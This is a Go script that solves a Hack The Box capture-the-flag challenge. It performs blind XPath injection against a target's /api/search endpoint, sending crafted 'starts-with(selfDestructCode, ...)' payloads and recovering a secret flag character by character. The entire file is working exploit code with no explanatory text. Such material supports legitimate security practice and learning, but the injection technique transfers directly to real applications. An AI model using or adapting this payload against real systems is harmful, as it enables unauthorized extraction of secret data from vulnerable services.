package main

import (
	"bytes"
	"fmt"
	"flag"
	"log"
	"os"
	"encoding/json"
	"net/http"
	"time"
)

type ResponseData struct {
	Message string `json:"message"`
	Success int `json:"success"`
}

func sendPayload(targetUrl string, payload string) ResponseData {
	payloadJson := map[string]string{"search": payload}
	jsonData, err := json.Marshal(payloadJson)
	if err != nil {
		panic(err)	
	}

	client := &http.Client{Timeout: 10 * time.Second}

	listEndpointUrl := fmt.Sprintf("%s/api/search", targetUrl)

	req, err := http.NewRequest(
		"POST", 
		listEndpointUrl,
		bytes.NewReader(jsonData))
	if err != nil {
		panic(err)	
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		panic(err)	
	}
	defer resp.Body.Close()

	var result ResponseData

	err = json.NewDecoder(resp.Body).Decode(&result)
	if err != nil {
		panic(err)	
	}	

	return result
}


func main() {
	targetUrl := flag.String("target_url", "", "Target URL for emoji voting")

	flag.Parse()

	if *targetUrl == "" {
		log.Println("Error: No target URL provided")
		flag.PrintDefaults()
		os.Exit(1)
	}

	fmt.Println("Extracting first part of flag...\n")

	const charSetPart1 = "_0123456789abcdefghijklmnopqrstuvwxyz$"
	flagPart1 := "HTB{"

	for {
		payload := fmt.Sprintf("Groorg' and selfDestructCode='%s", flagPart1)
		responseData := sendPayload(*targetUrl, payload)
		if responseData.Success == 1 {
			break
		}

		for _, char := range charSetPart1 {
			nextFlag := fmt.Sprintf("%s%c", flagPart1, char)

			payload = fmt.Sprintf("Groorg' and starts-with(selfDestructCode, '%s') and name='Groorg", nextFlag)
			responseData = sendPayload(*targetUrl, payload)

			if responseData.Success == 1 {
				flagPart1 = nextFlag 
				fmt.Printf("Flag part 1 fragment: %s\n", flagPart1)
				break
			}
		}

		if responseData.Success != 1 {
			panic("No more chars left to try, something went wrong!")
		}
	}

	fmt.Printf("\n\nFound first part of Flag: %s\n", flagPart1)
	fmt.Println("\nExtracting second part of flag...\n")

	const charSetPart2 = "_0123456789abcdefghijklmnopqrstuvwxyz$}-"
	flagPart2 := ""

	for {
		payload := fmt.Sprintf("Bobhura' and selfDestructCode='%s", flagPart2)
		responseData := sendPayload(*targetUrl, payload)
		if responseData.Success == 1 {
			break
		}

		for _, char := range charSetPart2 {
			nextFlag := fmt.Sprintf("%s%c", flagPart2, char)

			payload = fmt.Sprintf("Bobhura' and starts-with(selfDestructCode, '%s') and name='Bobhura", nextFlag)
			responseData = sendPayload(*targetUrl, payload)

			if responseData.Success == 1 {
				flagPart2 = nextFlag 
				fmt.Printf("Flag part 2 fragment: %s\n", flagPart2)
				break
			}
		}

		if responseData.Success != 1 {
			panic("No more chars left to try, something went wrong!")
		}
	}

	fmt.Printf("\n\nFull Flag: %s%s\n", flagPart1,flagPart2)
}
